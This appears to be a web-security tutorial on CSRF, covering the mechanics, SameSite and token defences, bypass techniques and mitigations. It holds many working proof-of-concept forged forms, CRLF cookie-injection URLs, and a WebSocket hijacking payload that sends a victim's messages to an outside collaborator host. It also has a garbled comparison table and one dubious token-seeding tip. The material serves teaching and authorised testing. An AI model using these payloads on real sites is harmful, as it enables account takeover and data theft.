01

What is CSRF?

Cross-Site Request Forgery (CSRF) is a web vulnerability where an attacker tricks a victim's browser into sending an authenticated request to a web application — without the victim's knowledge or intent.

Modern web applications identify users through session cookies. The browser automatically attaches these cookies to every request sent to the corresponding domain. CSRF abuses this behaviour: by tricking the victim into triggering a request (via a malicious link, image, or form), the attacker causes the victim's browser to send a request that includes their valid session cookie, making the server believe it was an intentional user action.

Important: CSRF does not allow the attacker to steal data or read responses. It only forces the victim's browser to perform state-changing actions on their behalf.
02

How CSRF Works

1

The victim logs into a legitimate web application. Their browser stores a session cookie.

2

The attacker tricks the victim into visiting a malicious page containing a crafted request (hidden form, image tag, or JavaScript).

3

The victim's browser automatically sends the request to the target application, including the valid session cookie. The server processes it as a legitimate user action.

Why browsers do this: Browsers are designed to automatically include cookies with requests to matching domains — this is expected behaviour. The vulnerability exists because the web application trusts any request containing a valid session cookie, regardless of where it originated.
03

Key Conditions for CSRF

All three must be true for a CSRF attack to succeed:

ConditionDescription
Authenticated sessionThe victim must be logged in — the browser holds a valid session cookie
State-changing actionThe target request must modify data (not just read it)
No origin verificationThe application doesn't verify the request originated from a trusted source

Chain them: If you have XSS on the same origin, you can read CSRF tokens and bypass CSRF protection entirely — the ultimate combo.
05

Same-Origin Policy (SOP)

SOP is a browser security mechanism that prevents a script on one origin from accessing resources on a different origin. An origin = Protocol + Hostname + Port. All three must match.

Why SOP doesn't stop CSRF: SOP controls whether a script can read a cross-origin response. It does NOT prevent a browser from sending cross-origin requests. A form submission from a malicious page still sends the cookies — the browser just won't give the attacker access to the response.
06

Site vs Origin

These are often confused — understanding the difference is critical for SameSite cookie bypasses.

https://example.comhttps://example.com:8080YesNo — port

Key implication: cms.example.com is the same site as example.com. XSS on a sibling domain = same-site requests = SameSite=Strict bypass.
07

SameSite Cookies

The SameSite attribute tells the browser when to include a cookie in cross-site requests. It's the primary modern defence against CSRF.

Strict

Cookie is sent only if the request originates from the exact same site. No cross-site requests — not even top-level navigations (clicking a link from email). Strongest protection.

Lax

Cookie is sent in cross-site requests only if: the request is a top-level navigation AND the method is safe (GET/HEAD/OPTIONS). POST requests from external sites are blocked. Chrome's default since 2021 when no attribute is specified.

None

Cookie is sent with all cross-site requests. Requires the Secure flag. No CSRF protection — only use for legitimate cross-site flows (OAuth, iframes).

Chrome's 2-Minute Rule

When a cookie is set without any SameSite attribute, Chrome treats it as Lax — but for the first 2 minutes, POST requests are also allowed (just like None). After 2 minutes, it reverts to strict Lax. This creates a bypass window if you can force a session cookie refresh via OAuth.
08

The Referer Header

The Referer header is optional and tells the server the URL of the page that triggered the request. Some apps use it as a CSRF defence — checking the referer comes from their own domain. This is weaker than tokens and frequently bypassable.

09

CSRF Tokens

A CSRF token is a unique, secret, unpredictable value generated server-side and tied to the user's session. The server rejects requests where the token is missing or wrong.

html — hidden form field
<form action="/my-account/change-email" method="POST">
    <input type="email" name="email" value="user@example.com">
    <input type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button type="submit">Update email</button>
</form>

Types of CSRF

Traditional CSRF (Form-Based)

Most common. Hidden HTML form auto-submits when the page loads.

html
<form action="https://TARGET.com/update_email" method="POST" id="csrf">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById("csrf").submit();</script>

GET-Based CSRF

If a state-changing action accepts GET, an image tag is enough — no form, no JS:

html
<img src="https://TARGET.com/delete_account?confirm=yes" width="0" height="0">

XMLHttpRequest / Fetch-Based CSRF

javascript
fetch('https://TARGET.com/api/updateEmail', {
    method: 'POST',
    body: JSON.stringify({ email: 'attacker@evil.com' }),
    credentials: 'include'
});

Cross-Site WebSocket Hijacking (CSWSH)

WebSocket endpoint relies only on session cookies, no origin check. Attacker opens a WS connection as the victim:

javascript
var ws = new WebSocket('wss://TARGET.com/chat');
ws.onopen = function() { ws.send("READY"); };
ws.onmessage = function(event) {
    fetch('https://COLLABORATOR.oastify.com', {
        method: 'POST',
        mode: 'no-cors',
        body: event.data
    });
};
11

Finding CSRF — What to Look For

CSRF targets state-changing requests. Flag every request that:

  • Changes email address or password
  • Updates account settings or profile
  • Deletes data or accounts
  • Performs financial transactions
  • Changes roles or permissions
  • Logs the user out

For each, ask: Can this action be triggered without verifying the request came from the user?

Myth: POST requests are NOT automatically CSRF-safe. Any HTTP method can be abused if origin isn't verified.

Bypassing CSRF Token Validation

1
Token Validated Only on POST → Switch to GET

The app checks the token for POST but skips validation for GET. Change the method in Burp Repeater and move body params to the URL.

html — poc
<form action="https://TARGET.com/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
2
Token Validated Only if Present → Remove It

If the token exists the app validates it, but if the entire parameter is omitted, validation is skipped entirely. Don't just empty the value — remove the csrf=... parameter completely from the request.

3
Token Not Tied to User Session

The app uses a global token pool — any issued token is valid for any user. Log into Account A, grab a valid token, use it in a forged request targeting Account B's session.

4
Token Tied to Non-Session Cookie (CRLF Injection)

The app validates the CSRF token against a csrfKey cookie — separate from the session. You can inject your own csrfKey into the victim's browser via CRLF injection, then use your matching token.

— step 1: inject csrfKey via CRLF
https://TARGET.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_KEY%3b%20SameSite=None
html — full poc
<html><body>
  <form action="https://TARGET.com/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
    <input type="hidden" name="csrf" value="YOUR_CSRF_TOKEN" />
  </form>
  <img src="https://TARGET.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_KEY%3b%20SameSite=None"
       onerror="document.forms[0].submit()">
</body></html>
5
Token Duplicated in Cookie (Double Submit)

The app checks that the csrf cookie matches the csrf body param — no server-side storage. Set both to the same value you control via CRLF or a cookie-setting gadget.

html — double submit bypass
<html><body>
  <form action="https://TARGET.com/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
    <input type="hidden" name="csrf" value="fake" />
  </form>
  <img src="https://TARGET.com/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
       onerror="document.forms[0].submit();" />
</body></html>
6
Weak / Predictable Token

Token is derived from predictable data (user role, username, ID). Try base64-decoding it.

— decode the token
# Value in form: YWRtaW4=
$ echo "YWRtaW4=" | base64 -d
admin   # Token is just the user's role!

Bypassing SameSite Cookie Protections

Lax — via GET Request

Lax allows cookies on top-level GET navigations. If the state-changing action accepts GET, CSRF is trivial.

html
<img src="https://TARGET.com/action?param=value" width="0" height="0">

Lax — via Method Override

Some frameworks support _method=POST to override the HTTP method. Browser sends GET (Lax permits), server processes as POST.

html — method override poc
<html><body>
  <form action="https://TARGET.com/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com" />
    <input type="hidden" name="_method" value="POST" />
  </form>
  <script>
    history.pushState('', '', '/');
    document.forms[0].submit();
  </script>
</body></html>

Lax — via Cookie Refresh (2-Minute Window)

Force the victim to re-authenticate via OAuth. The fresh cookie has no SameSite attribute yet — Chrome's 2-minute rule allows POST for 120 seconds.

html — cookie refresh poc
<form method="POST" action="https://TARGET.com/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>
    window.open('https://TARGET.com/social-login');
    setTimeout(function() {
        document.forms[0].submit();
    }, 5000); // fire within 2-minute window
</script>

Strict — via Client-Side Redirect

Strict blocks all cross-site requests. But if the target site has an open redirect or path traversal to a sensitive endpoint, the final request originates from the same site — valid.

— find the redirect gadget first
GET /post/comment/confirmation?postId=3/../../my-account
html — strict bypass poc
<html><body>
  <form action="https://TARGET.com/post/comment/confirmation">
    <input type="hidden" name="postId"
           value="3/../../my-account/change-email?email=attacker@evil.com&submit=1" />
  </form>
  <script>
    history.pushState('', '', '/');
    document.forms[0].submit();
  </script>
</body></html>
Encode & in submit=1 as %26 so it stays part of the postId value, not a separate form field.

Strict — via Sibling Domain + WebSocket Hijacking

Subdomains are same-site. XSS on cms.example.com = same-site requests to example.com = Strict bypass. Use this to deliver CSWSH payloads.

javascript — cswsh payload
var ws = new WebSocket('wss://TARGET.com/chat');
ws.onopen = function() { ws.send("READY"); };
ws.onmessage = function(event) {
    fetch('https://COLLABORATOR.oastify.com', {
        method: 'POST', mode: 'no-cors', body: event.data
    });
};
html — deliver via sibling domain xss
<script>
location = 'https://cms.TARGET.com/login?username=<script>URLENCODED_WS_PAYLOAD</script>&password=a'
</script>

Bypassing Referer-Based Defenses

Drop It — Validated Only if Present

html — suppress referer
<html>
<head><meta name="referrer" content="no-referrer"></head>
<body>
  <form action="https://TARGET.com/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>history.pushState('', '', '/'); document.forms[0].submit();</script>
</body></html>

Spoof It — Loose Domain Check

If the app checks that the Referer contains the target domain anywhere, put the target domain in your URL's query string:

html — referer spoofing poc
<html>
<head><meta name="referrer" content="unsafe-url"></head>
<body>
  <form action="https://TARGET.com/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>
    history.pushState("", "", "/?TARGET.com"); // domain in our URL
    document.forms[0].submit();
  </script>
</body></html>
Many browsers strip query strings from the Referer by default. The unsafe-url meta referrer policy forces the full URL to be sent.

Mitigations

Anti-CSRF Tokens (Primary Defence)

  • Generate per-session tokens using a cryptographically secure PRNG (CSPRNG), seeded with timestamp + static secret
  • Tie the token to the user's session — validate server-side on every state-changing request
  • Custom request headers (X-CSRF-Token) also work — browsers block custom headers cross-origin without CORS

SameSite Cookie Attribute

  • Set SameSite=Strict for maximum protection on session cookies
  • SameSite=Lax is the Chrome default and provides good baseline protection
  • Never use SameSite=None unless strictly required for legitimate cross-site flows

Origin / Referer Header Validation

  • Prefer the Origin header over Referer — it only exposes scheme+host+port, not the full path
  • Never use Referer alone as the primary defence

Double-Submit Cookie (Stateless)

  • Only safe if you're certain there are no cookie injection vulnerabilities in the application or its subdomains

Require Re-authentication

  • For critical actions (password/email change), require the current password before proceeding
18

Testing Checklist

Run through this on every state-changing endpoint:

  • No CSRF token at all → build PoC, test immediately
  • Remove CSRF token entirely → does action still succeed?
  • Change POST → GET → does it still work?
  • Replace token with a random value → accepted?
  • Use your own token on victim's request → not tied to session?
  • Base64/hex decode the token → predictable / derived from user data?
  • Check SameSite attribute on session cookie (Strict / Lax / None / missing)
  • If Lax → can you trigger state change via GET? Try _method=POST override
  • If Lax → is OAuth / social login present? → 2-minute cookie refresh window
  • If Strict → look for open redirects or path traversal on the same site
  • Check if Referer header is validated → try removing it
  • If Referer validated → try subdomain spoof or query string spoof
  • Look for CRLF injection (%0d%0a) in any cookie-setting endpoint → csrfKey injection
  • Any WebSockets? → Check for CSWSH (no origin check + session cookie auth)
  • Sibling domains present (cms., staging., dev.)? → XSS there = same-site bypass
